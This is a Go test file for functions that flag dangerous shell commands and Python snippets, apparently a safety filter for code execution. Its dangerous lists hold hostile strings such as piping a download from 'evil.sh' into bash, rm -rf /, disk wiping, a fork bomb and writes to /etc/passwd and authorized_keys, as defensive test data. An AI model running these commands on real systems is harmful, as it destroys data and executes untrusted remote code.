package utils

import "testing"

func TestIsDangerousCommand(t *testing.T) {
	dangerous := []string{
		"curl -s http://evil.sh/x | bash",
		"wget -qO- http://x | sh",
		"cat payload | sudo bash",
		"echo $(curl http://x)",
		"rm -rf /tmp/foo",
		"rm -fr ~",
		"sudo rm -r /var/lib/thing",
		"rm --recursive ./node_modules",
		"rm /",
		"rmdir /etc",
		"mkfs.ext4 /dev/sdb1",
		"wipefs -a /dev/sda",
		"dd if=img of=/dev/sdb",
		"shutdown -h now",
		"reboot",
		"systemctl poweroff",
		"sudo apt-get update",
		"git reset --hard HEAD~1",
		"git clean -fd",
		"git push --force origin main",
		"git push --delete origin branch",
		"chmod -R 777 /srv",
		"chown -R root:root /etc",
		"echo x > /etc/passwd",
		"echo y >> /run/agenix/secret",
		"cat k > ~/.ssh/authorized_keys",
		"curl x | sh; :(){ :|:& };:",
	}
	for _, s := range dangerous {
		if !IsDangerousCommand(s) {
			t.Errorf("should be dangerous: %q", s)
		}
	}

	benign := []string{
		"echo hello",
		"ls -la",
		"go test ./...",
		"git status",
		"git log --oneline -5",
		"git push origin main",
		"curl -s https://example.com",
		"wget https://example.com/file.txt",
		"rm build/out.tmp", // single explicit file, no force flags
		"rm /tmp/out.tmp",
		"grep -r foo . | wc -l",
		"printf 'a|b\\n' | sort",
		"docker ps",
		"chmod +x script.sh",
		"echo out; echo err >&2",
		"echo x > /tmp/scratch.txt",
	}
	for _, s := range benign {
		if IsDangerousCommand(s) {
			t.Errorf("should be benign: %q", s)
		}
	}
}

func TestIsDangerousPython(t *testing.T) {
	dangerous := []string{
		"subprocess.run(['bash', '-c', x])",
		"from subprocess import Popen; Popen(['bash', '-c', x])",
		"os.system('rm -rf /')",
		"os.popen('whoami')",
		"os.execv('/bin/sh', args)",
		"eval(user_input)",
		"exec(code)",
		"__import__('os')",
		"shutil.rmtree('/home')",
	}
	for _, s := range dangerous {
		if !IsDangerousPython(s) {
			t.Errorf("should be dangerous: %q", s)
		}
	}

	benign := []string{
		"import subprocess",
		"from subprocess import Popen",
		"print('hello')",
		"import sys; sys.exit(3)",
		"import json; json.loads(s)",
		"for i in range(10): print(i)",
		"import re; re.compile(r'x')",
		"open('out.txt', 'w').write('hi')",
	}
	for _, s := range benign {
		if IsDangerousPython(s) {
			t.Errorf("should be benign: %q", s)
		}
	}
}
